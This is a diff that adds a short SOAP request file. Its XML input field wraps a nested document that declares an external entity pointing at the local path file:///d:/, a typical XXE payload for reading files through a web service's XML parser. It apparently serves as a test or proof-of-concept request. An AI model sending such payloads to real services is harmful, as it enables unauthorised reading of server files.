@@ -1,0 +1,13 @@
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <foo:calculateStuff>
+         <!--Optional:-->
+         <xmlInput><![CDATA[<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE currency [  
+   <!ENTITY include SYSTEM "file:///d:/" >]>
+<calcinput>...</calcinput>
+]]></xmlInput>
+      </foo:calculateStuff>
+   </soapenv:Body>
+</soapenv:Envelope>
